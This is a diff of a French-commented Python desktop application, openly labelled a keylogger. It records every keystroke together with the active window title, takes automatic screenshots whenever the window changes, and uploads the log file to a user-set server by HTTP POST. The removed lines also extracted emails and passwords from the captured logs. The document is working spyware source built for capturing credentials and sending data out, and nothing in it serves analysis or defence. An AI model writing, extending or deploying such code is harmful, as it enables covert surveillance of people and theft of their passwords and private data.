@@ -3,348 +3,287 @@ from ttkbootstrap.constants import *
 import threading
 import time
 import os
+import ctypes  # Pour l'API Windows (remplace win32gui pour plus de facilité)
 from datetime import datetime
-from tkinter import filedialog, StringVar, BooleanVar, W, E, LEFT, RIGHT, BOTH, YES, CENTER, END
+from tkinter import filedialog, StringVar, BooleanVar, END, LEFT, RIGHT, BOTH, YES, W, E
 
-# --- IMPORTS CRITIQUES ---
+# --- 1. GESTION DES IMPORTS ---
 try:
     import requests
     from pynput import keyboard
-    import pygetwindow as gw  # Nécessaire pour la détection des fenêtres
-    
-    # Imports de vos autres modules (assurez-vous qu'ils existent)
-    from classifier import classify_text
-    from screenshot import take_screenshot, get_active_window_info
-    
+    from PIL import ImageGrab  # Remplace mss pour une intégration plus simple
 except ImportError as e:
-    print(f"Erreur d'importation : {e}")
-    # On continue pour permettre à l'interface de s'afficher même si un module manque (pour debug)
+    print(f"ERREUR CRITIQUE : Il manque des modules Python.\nErreur : {e}")
+    print("Exécutez : pip install ttkbootstrap pynput requests Pillow")
 
-# --- 1. VARIABLES GLOBALES ---
+# --- 2. CONFIGURATION API WINDOWS (Le secret pour les titres détaillés) ---
+# Cette partie remplace 'pygetwindow' et utilise la méthode native de Windows
+# pour obtenir exactement ce que vous voyez dans la barre des tâches.
+if os.name == 'nt':
+    user32 = ctypes.windll.user32
+    kernel32 = ctypes.windll.kernel32
+    
+    def get_detailed_window_title():
+        """Récupère le titre EXACT via l'API Windows."""
+        h_wnd = user32.GetForegroundWindow()  # Récupère la fenêtre active
+        length = user32.GetWindowTextLengthW(h_wnd)
+        buf = ctypes.create_unicode_buffer(length + 1)
+        user32.GetWindowTextW(h_wnd, buf, length + 1)
+        
+        title = buf.value
+        if not title:
+            return "Desktop / Inconnu"
+        return title
+else:
+    # Fallback pour Mac/Linux
+    def get_detailed_window_title():
+        return "OS non-Windows (Titre indisponible)"
+
+# --- 3. VARIABLES GLOBALES ---
+# Ces variables sont partagées par toute l'application
 global_key_listener = None
 keylogger_running = False
-last_window_title = ""  # Variable critique pour suivre la fenêtre
-
+last_window_title = "" 
 screenshot_monitor_thread = None
 screenshot_monitor_running = False
 
-
-# --- 2. LOGIQUE DU KEYLOGGER ET DÉTECTION WINDOWS (INTÉGRÉE) ---
-
-def get_active_window_title():
-    """
-    Récupère le titre de la fenêtre active avec précision.
-    Intégré ici pour garantir que la GUI l'utilise correctement.
-    """
+# --- 4. FONCTION CAPTURE D'ÉCRAN (Basée sur votre capture.py) ---
+def internal_take_screenshot():
+    """Prend une capture et la sauvegarde dans le dossier screenshots."""
     try:
-        active_window = gw.getActiveWindow()
-
-        # Si aucune fenêtre n'est active (souvent le bureau)
-        if active_window is None:
-            return "Desktop"
-
-        title = active_window.title
-
-        # Vérifications spécifiques OS
-        if title == "Program Manager":  # Windows Desktop
-            return "Desktop"
-        elif title == "Finder": # macOS Desktop
-            return "Desktop"
-        elif not title.strip(): # Titre vide
-             return "Desktop"
-        else:
-            return title
+        if not os.path.exists("screenshots"):
+            os.makedirs("screenshots")
             
-    except Exception:
-        return "Desktop"
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"screenshots/cap_{timestamp}.png"
+        
+        # Capture tout l'écran
+        screenshot = ImageGrab.grab(all_screens=True)
+        screenshot.save(filename)
+        print(f"[CAPTURE] Sauvegardée : {filename}")
+        return True
+    except Exception as e:
+        print(f"[ERREUR CAPTURE] : {e}")
+        return False
+
+# --- 5. MOTEUR KEYLOGGER (Basé sur keylogwin.py) ---
 
 def on_press(key):
-    """Fonction appelée à chaque frappe de touche."""
     global last_window_title
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
-    # Récupération du titre ACTUEL
-    current_window_title = get_active_window_title()
+    # Utilisation de la détection API Windows
+    current_window_title = get_detailed_window_title()
 
     try:
         with open('keylog.txt', 'a', encoding='utf-8') as f:
-            # Si la fenêtre a changé, on l'écrit dans le log
+            # 1. Détection changement de fenêtre
             if current_window_title != last_window_title:
-                f.write(f'\n--- Window changed to: [{current_window_title}] at {timestamp} ---\n')
+                log_msg = f'\n--- [WIN] Changed to: {current_window_title} at {timestamp} ---\n'
+                f.write(log_msg)
                 last_window_title = current_window_title
-                print(f"[DEBUG] Fenêtre détectée : {current_window_title}") # Debug console
+                print(f"[FENÊTRE] {current_window_title}")  # Debug console
 
-            # Log de la touche
-            if hasattr(key, 'char') and key.char:
-                f.write(f'[{timestamp}] Key: {key.char}\n')
+            # 2. Enregistrement de la touche
+            k = str(key).replace("'", "")
+            if "Key." in k:
+                # Touches spéciales (Espace, Entrée, etc.)
+                if k == "Key.space":
+                    f.write(" ")
+                elif k == "Key.enter":
+                    f.write("\n")
+                else:
+                    f.write(f' [{k}] ')
             else:
-                f.write(f'[{timestamp}] Special: {key}\n')
+                # Lettres normales
+                f.write(k)
                 
     except Exception as e:
         print(f"Erreur écriture log: {e}")
 
-def on_release(key):
-    """Arrêt d'urgence avec ESC (optionnel dans la GUI mais utile)."""
-    if key == keyboard.Key.esc:
-        # Dans une GUI, on évite souvent que ESC tue le listener brutalement, 
-        # mais on peut le laisser si vous le souhaitez.
-        pass 
-
-def start_keylogger_listener():
-    """Démarre le Keylogger Pynput."""
+def start_keylogger_thread():
+    """Lance le listener dans un thread pour ne pas bloquer l'interface."""
     global global_key_listener, last_window_title
-    
-    # Réinitialiser pour forcer la détection de la fenêtre actuelle au démarrage
     last_window_title = "" 
-    
-    # Utilise les fonctions définies ci-dessus (locales)
-    global_key_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    global_key_listener = keyboard.Listener(on_press=on_press)
     global_key_listener.start()
 
+# --- 6. MOTEUR SURVEILLANCE CAPTURE (Basé sur capture.py) ---
 
-# --- 3. FONCTIONS DE CONTRÔLE GUI ---
-
-def toggle_keylogger(status_var, button):
-    global keylogger_running
-
-    if not keylogger_running:
-        try:
-            start_keylogger_listener()
-            keylogger_running = True
-            status_var.set("Statut: Keylogger ACTIF (Enregistrement...)")
-            button.config(text="Arrêter le Keylogger", bootstyle="danger-outline")
-            print("Keylogger Démarré.")
-        except Exception as e:
-            status_var.set(f"Erreur Démarrage: {e}")
-            print(f"Erreur start: {e}")
-    else:
-        if global_key_listener:
-            global_key_listener.stop()
-            
-        keylogger_running = False
-        status_var.set("Statut: Keylogger INACTIF")
-        button.config(text="Démarrer le Keylogger", bootstyle="success-outline")
-        print("Keylogger Arrêté.")
-
-# --- 4. FONCTIONS SCREENSHOT (Reste inchangé) ---
-
-def take_screenshot_now():
-    try:
-        take_screenshot()
-        print("Capture manuelle effectuée.")
-        ttk.dialogs.Messagebox.show_info("Succès", "Capture sauvegardée.")
-    except Exception as e:
-        print(f"Erreur capture: {e}")
-
-def start_screenshot_monitor_logic():
+def monitor_loop():
+    """Surveille les changements de fenêtres pour prendre des photos."""
     global screenshot_monitor_running
-    last_window_info = None
+    print("Début boucle surveillance capture...")
+    
+    local_last_title = ""
     
     while screenshot_monitor_running:
         try:
-            current_window_info = get_active_window_info()
-            if current_window_info[0] is not None and current_window_info != last_window_info:
-                print(f"Changement détecté : Capture...")
-                take_screenshot()
-                last_window_info = current_window_info
-            time.sleep(1)
+            curr = get_detailed_window_title()
+            
+            # Si le titre change et n'est pas vide/bureau
+            if curr != local_last_title and "Desktop" not in curr:
+                print(f"[AUTO-CAPTURE] Changement vers : {curr}")
+                internal_take_screenshot()
+                local_last_title = curr
+            
+            time.sleep(1)  # Vérifie toutes les secondes
         except Exception as e:
-            print(f"Erreur moniteur: {e}")
+            print(f"Erreur Loop Monitor: {e}")
             break
-    screenshot_monitor_running = False
 
-def toggle_screenshot_monitor(var_auto_screenshot):
-    global screenshot_monitor_thread, screenshot_monitor_running
-    if var_auto_screenshot.get():
-        if not screenshot_monitor_running:
-            screenshot_monitor_running = True
-            screenshot_monitor_thread = threading.Thread(target=start_screenshot_monitor_logic, daemon=True)
-            screenshot_monitor_thread.start()
-            print("Moniteur Capture: ON")
-    else:
-        screenshot_monitor_running = False
-        print("Moniteur Capture: OFF")
+# --- 7. MOTEUR ENVOI SERVEUR (Basé sur reqlogger.py) ---
 
-
-# --- 5. FONCTIONS ANALYSE & ENVOI (Reste inchangé) ---
-
-def run_classification(file_path, tree_emails, tree_passwords):
-    # Nettoyage
-    for i in tree_emails.get_children(): tree_emails.delete(i)
-    for i in tree_passwords.get_children(): tree_passwords.delete(i)
-        
-    if not os.path.isfile(file_path):
-        ttk.dialogs.Messagebox.show_error("Erreur", "Fichier introuvable.")
-        return
-
+def send_logs_thread(url, filepath, status_var):
+    status_var.set("Envoi en cours...")
     try:
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            text = f.read()
-            
-        result = classify_text(text)
+        if not os.path.exists(filepath):
+            status_var.set("Erreur: Fichier introuvable")
+            return
 
-        for item in result['emails']:
-            tree_emails.insert('', END, values=(item['value'], item['count']))
-        for item in result['passwords']:
-            tree_passwords.insert('', END, values=(item['value'], item['count']))
-            
-        ttk.dialogs.Messagebox.show_info("Terminé", "Analyse terminée.")
-    except Exception as e:
-        print(f"Erreur classifier: {e}")
-
-def send_logs_to_server(url, file_path, status_label, root_window):
-    if not os.path.isfile(file_path):
-        root_window.after(0, lambda: ttk.dialogs.Messagebox.show_error("Erreur", "Fichier log introuvable."))
-        return
+        with open(filepath, 'r', encoding='utf-8') as f:
+            data = f.read()
         
-    def send_in_thread():
-        status_label.set("Envoi en cours...")
-        try:
-            with open(file_path, 'r', encoding='utf-8') as f:
-                data = f.read()
-            response = requests.post(url, data={'log': data}, timeout=5)
-            
-            if response.status_code == 200:
-                status_label.set("Statut: ✅ Envoyé")
-            else:
-                status_label.set(f"Statut: ⚠️ Erreur {response.status_code}")
-        except Exception as e:
-            status_label.set("Statut: ❌ Erreur connexion")
-            print(e)
-
-    threading.Thread(target=send_in_thread, daemon=True).start()
-
-# --- 6. NAVIGATION & GUI SETUP ---
-
-def show_frame(frame):
-    frame.tkraise()
-    
-def set_nav_style(btn_list, active_btn):
-    for btn in btn_list:
-        if btn == active_btn:
-            btn.config(bootstyle="primary-outline")
+        # Envoi au serveur
+        response = requests.post(url, data={'log': data}, timeout=10)
+        
+        if response.status_code == 200:
+            status_var.set("✅ Logs envoyés avec succès!")
         else:
-            btn.config(bootstyle="secondary-link")
+            status_var.set(f"⚠️ Erreur Serveur: {response.status_code}")
+            
+    except Exception as e:
+        status_var.set(f"❌ Erreur Connexion: {str(e)[:20]}...")
+        print(e)
 
-def select_file_for_analysis(var):
-    path = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
-    if path: var.set(path)
+
+# ==============================================================================
+# INTERFACE GRAPHIQUE (GUI) - RECONSTRUCTION COMPLÈTE
+# ==============================================================================
 
 def main_gui():
-    app = ttk.Window(themename="darkly")
-    app.title("Control Panel - Keylogger & Monitor")
-    app.geometry("900x650")
+    app = ttk.Window(themename="superhero")
+    app.title("Advanced System Logger (Integrated)")
+    app.geometry("950x700")
     
-    # Variables
-    keylog_status_var = StringVar(value="Statut: Keylogger INACTIF")
-    reqlog_status_var = StringVar(value="Envoi: En attente")
-    url_var = StringVar(value="http://localhost:8000/logs")
-    log_file_var = StringVar(value="keylog.txt")
-    file_path_analysis_var = StringVar(value="keylog.txt") 
-    var_auto_screenshot = BooleanVar(value=False)
+    # --- Variables de contrôle ---
+    status_kl = StringVar(value="Statut: INACTIF")
+    status_upload = StringVar(value="En attente")
+    var_auto_screen = BooleanVar(value=False)
+    var_url = StringVar(value="http://localhost:8000/logs")
+    var_logfile = StringVar(value="keylog.txt")
 
-    # Layout
-    main_container = ttk.Frame(app)
-    main_container.pack(fill=BOTH, expand=YES)
-    
-    # Sidebar
-    sidebar = ttk.Frame(main_container, width=200, padding=15, bootstyle="dark")
-    sidebar.pack(side=LEFT, fill=Y)
-    ttk.Label(sidebar, text="MONITORING", font=('Helvetica', 14, 'bold'), bootstyle="primary").pack(pady=(10, 30))
-    
-    # Content Area
-    content_container = ttk.Frame(main_container, padding=20)
-    content_container.pack(side=RIGHT, fill=BOTH, expand=YES)
-    content_container.grid_columnconfigure(0, weight=1)
-    content_container.grid_rowconfigure(0, weight=1)
+    # --- Fonctions Commandes ---
+    def action_toggle_kl():
+        global keylogger_running
+        if not keylogger_running:
+            start_keylogger_thread()
+            keylogger_running = True
+            status_kl.set("Statut: 🟢 ENREGISTREMENT EN COURS")
+            btn_kl.config(bootstyle="danger", text="Arrêter Keylogger")
+        else:
+            if global_key_listener: global_key_listener.stop()
+            keylogger_running = False
+            status_kl.set("Statut: 🔴 INACTIF")
+            btn_kl.config(bootstyle="success", text="Démarrer Keylogger")
 
-    frames = {}
+    def action_toggle_monitor():
+        global screenshot_monitor_running, screenshot_monitor_thread
+        if var_auto_screen.get():
+            if not screenshot_monitor_running:
+                screenshot_monitor_running = True
+                screenshot_monitor_thread = threading.Thread(target=monitor_loop, daemon=True)
+                screenshot_monitor_thread.start()
+        else:
+            screenshot_monitor_running = False
 
-    # --- FRAME CONTROL ---
-    control_frame = ttk.Frame(content_container)
-    control_frame.grid(row=0, column=0, sticky="nsew")
-    frames['control'] = control_frame
+    def action_manual_snap():
+        if internal_take_screenshot():
+            ttk.dialogs.Messagebox.show_info("Capture", "Image sauvegardée dans /screenshots")
     
-    ttk.Label(control_frame, text="KEYLOGGER", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=(0,10))
-    ttk.Label(control_frame, textvariable=keylog_status_var, font=('Helvetica', 12)).pack(anchor=W, pady=5)
-    
-    btn_keylog = ttk.Button(control_frame, text="Démarrer le Keylogger", 
-                            command=lambda: toggle_keylogger(keylog_status_var, btn_keylog), 
-                            bootstyle="success-outline", width=30)
-    btn_keylog.pack(anchor=W, pady=10)
-    
-    ttk.Separator(control_frame).pack(fill=X, pady=20)
-    
-    # Section Envoi
-    ttk.Label(control_frame, text="SERVER UPLOAD", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=(0,10))
-    req_grid = ttk.Frame(control_frame)
-    req_grid.pack(fill=X)
-    req_grid.columnconfigure(1, weight=1)
-    
-    ttk.Label(req_grid, text="URL:").grid(row=0, column=0, sticky=W)
-    ttk.Entry(req_grid, textvariable=url_var).grid(row=0, column=1, sticky=W+E, padx=5)
-    
-    ttk.Button(req_grid, text="Envoyer Logs", 
-               command=lambda: send_logs_to_server(url_var.get(), log_file_var.get(), reqlog_status_var, app),
-               bootstyle="warning").grid(row=2, column=1, sticky=E, pady=10)
-    ttk.Label(req_grid, textvariable=reqlog_status_var).grid(row=2, column=0, sticky=W)
+    def action_upload():
+        threading.Thread(target=send_logs_thread, 
+                         args=(var_url.get(), var_logfile.get(), status_upload), 
+                         daemon=True).start()
 
-    # --- FRAME CAPTURE ---
-    capture_frame = ttk.Frame(content_container)
-    capture_frame.grid(row=0, column=0, sticky="nsew")
-    frames['capture'] = capture_frame
-    
-    ttk.Label(capture_frame, text="SCREENSHOTS", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=20)
-    
-    btn_man = ttk.Button(capture_frame, text="📸 Capture Immédiate", command=take_screenshot_now, bootstyle="info", width=30)
-    btn_man.pack(anchor=W, pady=10)
-    
-    ttk.Checkbutton(capture_frame, text="Activer Surveillance Auto", variable=var_auto_screenshot, 
-                    command=lambda: toggle_screenshot_monitor(var_auto_screenshot), bootstyle="success-round-toggle").pack(anchor=W, pady=20)
+    def action_read_log():
+        # Affiche le contenu du fichier dans la zone texte
+        txt_display.delete('1.0', END)
+        if os.path.exists(var_logfile.get()):
+            with open(var_logfile.get(), 'r', encoding='utf-8') as f:
+                content = f.read()
+                txt_display.insert(END, content)
+        else:
+            txt_display.insert(END, "Fichier log introuvable.")
 
-    # --- FRAME ANALYSIS ---
-    analysis_frame = ttk.Frame(content_container)
-    analysis_frame.grid(row=0, column=0, sticky="nsew")
-    frames['analysis'] = analysis_frame
+    # --- STRUCTURE DE LA PAGE ---
     
-    ttk.Label(analysis_frame, text="ANALYSE LOGS", font=('Helvetica', 18, 'bold'), bootstyle="primary").pack(anchor=W, pady=20)
-    
-    af_ctrl = ttk.Frame(analysis_frame)
-    af_ctrl.pack(fill=X)
-    ttk.Entry(af_ctrl, textvariable=file_path_analysis_var, width=40).pack(side=LEFT, padx=5)
-    ttk.Button(af_ctrl, text="...", command=lambda: select_file_for_analysis(file_path_analysis_var), width=3).pack(side=LEFT)
-    ttk.Button(af_ctrl, text="Analyser", command=lambda: run_classification(file_path_analysis_var.get(), tree_emails, tree_passwords), bootstyle="info").pack(side=LEFT, padx=10)
+    # 1. En-tête
+    header = ttk.Frame(app, padding=10, bootstyle="secondary")
+    header.pack(fill=X)
+    ttk.Label(header, text="SYSTEM MONITOR & LOGGER", font=("Segoe UI", 20, "bold"), bootstyle="inverse-secondary").pack()
 
-    res_frame = ttk.Frame(analysis_frame)
-    res_frame.pack(fill=BOTH, expand=YES, pady=10)
-    
-    # Treeviews
-    f_email = ttk.Labelframe(res_frame, text="Emails")
-    f_email.pack(side=LEFT, fill=BOTH, expand=YES, padx=5)
-    tree_emails = ttk.Treeview(f_email, columns=('val','count'), show='headings')
-    tree_emails.heading('val', text='Email'); tree_emails.heading('count', text='Nbr')
-    tree_emails.pack(fill=BOTH, expand=YES)
-    
-    f_pass = ttk.Labelframe(res_frame, text="Mots de Passe")
-    f_pass.pack(side=LEFT, fill=BOTH, expand=YES, padx=5)
-    tree_passwords = ttk.Treeview(f_pass, columns=('val','count'), show='headings')
-    tree_passwords.heading('val', text='Password'); tree_passwords.heading('count', text='Nbr')
-    tree_passwords.pack(fill=BOTH, expand=YES)
+    # 2. Conteneur principal (Tabs)
+    notebook = ttk.Notebook(app, bootstyle="primary")
+    notebook.pack(fill=BOTH, expand=YES, padx=10, pady=10)
 
-    # --- NAV BUTTONS ---
-    navs = []
-    b1 = ttk.Button(sidebar, text="Contrôle", command=lambda: (show_frame(frames['control']), set_nav_style(navs, b1)))
-    b1.pack(fill=X, pady=5); navs.append(b1)
-    
-    b2 = ttk.Button(sidebar, text="Capture", command=lambda: (show_frame(frames['capture']), set_nav_style(navs, b2)))
-    b2.pack(fill=X, pady=5); navs.append(b2)
-    
-    b3 = ttk.Button(sidebar, text="Analyse", command=lambda: (show_frame(frames['analysis']), set_nav_style(navs, b3)))
-    b3.pack(fill=X, pady=5); navs.append(b3)
+    # --- ONGLET 1 : CONTRÔLE ---
+    tab_control = ttk.Frame(notebook, padding=20)
+    notebook.add(tab_control, text=" 🎮 Contrôle ")
 
-    show_frame(frames['control'])
-    set_nav_style(navs, b1)
+    # Section Keylogger
+    lf_kl = ttk.Labelframe(tab_control, text=" Keylogger ", padding=15, bootstyle="info")
+    lf_kl.pack(fill=X, pady=10)
     
+    lbl_status = ttk.Label(lf_kl, textvariable=status_kl, font=("Consolas", 14, "bold"))
+    lbl_status.pack(pady=10)
+    
+    btn_kl = ttk.Button(lf_kl, text="Démarrer Keylogger", command=action_toggle_kl, bootstyle="success", width=40)
+    btn_kl.pack(pady=5)
+    
+    ttk.Label(lf_kl, text="Note: Les fenêtres sont détectées via l'API Windows native.", font=("Arial", 8, "italic")).pack(pady=5)
+
+    # Section Screenshots
+    lf_screen = ttk.Labelframe(tab_control, text=" Captures d'écran ", padding=15, bootstyle="warning")
+    lf_screen.pack(fill=X, pady=10)
+    
+    btn_snap = ttk.Button(lf_screen, text="📸 Capture Immédiate", command=action_manual_snap, bootstyle="warning-outline", width=40)
+    btn_snap.pack(pady=5)
+    
+    cb_monitor = ttk.Checkbutton(lf_screen, text="Activer la surveillance automatique (Capture au changement de fenêtre)", 
+                                 variable=var_auto_screen, command=action_toggle_monitor, bootstyle="round-toggle")
+    cb_monitor.pack(pady=10)
+
+    # --- ONGLET 2 : ANALYSE ---
+    tab_analysis = ttk.Frame(notebook, padding=20)
+    notebook.add(tab_analysis, text=" 📊 Analyse Log ")
+    
+    tool_frame = ttk.Frame(tab_analysis)
+    tool_frame.pack(fill=X, pady=5)
+    ttk.Button(tool_frame, text="🔄 Actualiser / Lire le fichier", command=action_read_log, bootstyle="info").pack(side=LEFT)
+    
+    txt_display = ttk.Text(tab_analysis, height=20, font=("Consolas", 10))
+    txt_display.pack(fill=BOTH, expand=YES, pady=5)
+
+    # --- ONGLET 3 : UPLOAD ---
+    tab_upload = ttk.Frame(notebook, padding=20)
+    notebook.add(tab_upload, text=" ☁️ Upload ")
+    
+    ttk.Label(tab_upload, text="Configuration Serveur (reqlogger)", font=("Arial", 12, "bold")).pack(pady=10)
+    
+    form_frame = ttk.Frame(tab_upload)
+    form_frame.pack(pady=10)
+    
+    ttk.Label(form_frame, text="URL Serveur:").grid(row=0, column=0, padx=5, pady=5, sticky=E)
+    ttk.Entry(form_frame, textvariable=var_url, width=40).grid(row=0, column=1, padx=5, pady=5)
+    
+    ttk.Label(form_frame, text="Fichier Log:").grid(row=1, column=0, padx=5, pady=5, sticky=E)
+    ttk.Entry(form_frame, textvariable=var_logfile, width=40).grid(row=1, column=1, padx=5, pady=5)
+    
+    ttk.Button(tab_upload, text="Envoyer les données", command=action_upload, bootstyle="primary").pack(pady=20)
+    ttk.Label(tab_upload, textvariable=status_upload, font=("Arial", 11)).pack()
+
+    # Lancement
     app.mainloop()
 
 if __name__ == "__main__":
